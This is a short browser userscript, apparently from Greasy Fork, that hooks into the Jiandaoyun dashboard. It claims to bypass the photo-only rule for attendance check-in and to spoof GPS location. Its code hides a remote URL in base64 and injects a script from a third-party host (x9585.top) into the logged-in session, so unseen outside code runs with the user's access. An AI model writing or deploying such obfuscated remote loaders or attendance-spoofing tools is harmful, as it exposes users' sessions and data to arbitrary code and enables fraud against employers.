// ==UserScript==
// @name         完工办_简道云打卡注入
// @namespace    wgb_jdy_daka
// @version      1.3.1.4
// @description  取消仅拍照限制和修改GPS定位！
// @author       9585星云的躺平者
// @match        https://www.jiandaoyun.com/dashboard*
// @grant        none
// @connect      www.x9585.top
// @antifeature      ads
// @antifeature      membership
// @license            MIT
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/506919/%E5%AE%8C%E5%B7%A5%E5%8A%9E_%E7%AE%80%E9%81%93%E4%BA%91%E6%89%93%E5%8D%A1%E6%B3%A8%E5%85%A5.user.js
// @updateURL https://update.greasyfork.org/scripts/506919/%E5%AE%8C%E5%B7%A5%E5%8A%9E_%E7%AE%80%E9%81%93%E4%BA%91%E6%89%93%E5%8D%A1%E6%B3%A8%E5%85%A5.meta.js
// ==/UserScript==

(function() {
    'use strict';
    if(/www\.jiandaoyun\.com\/dashboard#\/app\/*/.test(window.location.href)){
        var script = document.createElement('script');
        script.src = atob("aHR0cHM6Ly93d3cueDk1ODUudG9wL0VYRS9XR0JfamlhbmRhb3l1bi8=");
        document.head.appendChild(script);
    }
})();